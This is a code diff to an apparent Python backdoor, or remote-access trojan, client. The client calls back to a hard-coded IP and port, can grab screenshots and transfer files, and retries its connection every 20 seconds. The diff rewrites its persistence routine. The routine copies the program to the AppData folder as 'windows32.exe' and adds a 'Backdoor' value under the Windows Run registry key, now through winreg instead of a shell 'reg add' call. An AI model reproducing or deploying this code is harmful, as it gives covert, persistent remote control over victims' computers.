@@ -13,17 +13,23 @@ import sys
 import shutil
 from PIL import ImageGrab
 import tempfile
+import winreg as wrg
 
 ip = "172.25.191.60"
 port = 8080
 
-def registry():
-    if os.name == "nt": 
-        location = os.environ['appdata']+'\\windows32.exe'
-        if not os.path.exists(location):
-            shutil.copyfile (sys.executable, location)
-            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "'
-                            + location + '"', shell=True)
+# https://www.geeksforgeeks.org/python/manipulating-windows-registry-using-winreg-in-python/
+def setAutostart():
+    # Copy executable and set Windows registry autorun value
+    if os.name == "nt":
+        appdataDir = os.environ['appdata']
+        executablePath = os.path.join(appdataDir, "windows32.exe")
+        if not os.path.exists(executablePath):
+            shutil.copyfile(sys.executable, executablePath)
+
+            with wrg.OpenKey(wrg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, wrg.KEY_SET_VALUE) \
+            as key:
+                wrg.SetValueEx(key, "Backdoor", 0, wrg.REG_SZ, '"' + executablePath + '"')
 
 def transfer(s, path):
     if os.path.exists(path):
@@ -41,7 +47,7 @@ def initiate():
     tuneConnection()
 
 def tuneConnection():
-    registry()
+    setAutostart()
     # Trying to connect to server every 20 seconds
     while True:
         try:
